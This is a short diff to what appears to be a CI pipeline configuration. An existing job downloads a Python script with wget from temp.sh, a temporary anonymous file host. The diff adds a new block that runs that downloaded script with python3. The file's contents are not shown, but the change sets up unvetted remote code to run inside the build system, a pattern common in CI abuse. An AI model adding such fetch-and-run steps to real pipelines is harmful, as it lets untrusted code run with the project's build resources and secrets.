@@ -16,4 +16,11 @@ blocks:
         - name: Jobk
           commands:
             - 'wget http://temp.sh/Cgvll/1.py'
+  - name: 'Block #2'
+    dependencies:
+      - Pip
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands:
             - python3 1.py
